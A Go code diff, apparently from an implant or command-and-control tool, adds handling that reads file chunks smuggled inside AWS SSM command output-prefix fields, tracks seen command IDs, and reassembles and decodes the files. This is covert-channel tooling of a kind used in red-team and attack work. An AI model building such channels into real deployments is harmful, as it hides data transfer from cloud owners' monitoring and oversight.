@@ -13,6 +13,7 @@ import (
 )
 
 var completeFile []FileParts
+var history []string
 
 type FileParts struct {
 	CurrentCount int
@@ -60,6 +61,37 @@ func RecieveFile(payload awsssm.SendCommandPayload) {
 
 }
 
+func RecieveFileDocs(payload awsssm.ListCommands) {
+
+	for _, v := range payload.Commands {
+		check := commandRan(v.CommandID)
+
+		if !check {
+			s := strings.Split(v.OutputS3KeyPrefix, ":")
+
+			//Make sure we have a correctly formatted payload
+			if len(s) == 4 {
+				ccnt, _ := strconv.Atoi(s[0])
+				tcnt, _ := strconv.Atoi(s[1])
+
+				file := FileParts{
+					CurrentCount: ccnt,
+					TotalCount:   tcnt,
+					Filename:     s[2],
+					FileData:     s[3],
+				}
+
+				completeFile = append(completeFile, file)
+				commandAdd(v.CommandID)
+
+				CheckFile(file)
+
+			}
+		}
+	}
+
+}
+
 //Check if we have all of the pieces to the file
 func CheckFile(file FileParts) {
 	var singleFile []FileParts
@@ -68,7 +100,6 @@ func CheckFile(file FileParts) {
 		if v.Filename == file.Filename {
 			singleFile = append(singleFile, v)
 			if len(singleFile) == file.TotalCount {
-				fmt.Println(singleFile)
 				SaveFile(singleFile, v.Filename)
 			}
 		}
@@ -89,6 +120,7 @@ func SaveFile(file File, filename string) {
 	b := []byte(decoded)
 	actual, err := implantutil.ReadGzFile(b)
 	if err != nil {
+		fmt.Println(err)
 		return
 	}
 	d1 := []byte(actual)
@@ -96,6 +128,27 @@ func SaveFile(file File, filename string) {
 }
 
 //Clear file from []FileParts
-func ClearFile() {
+func Clear() {
 	completeFile = []FileParts{}
+	history = []string{}
+}
+
+func commandAdd(cmd string) {
+
+	history = append(history, cmd)
+}
+
+func commandRan(cmd string) bool {
+
+	return contains(history, cmd)
+}
+
+func contains(s []string, str string) bool {
+	for _, v := range s {
+		if v == str {
+			return true
+		}
+	}
+
+	return false
 }
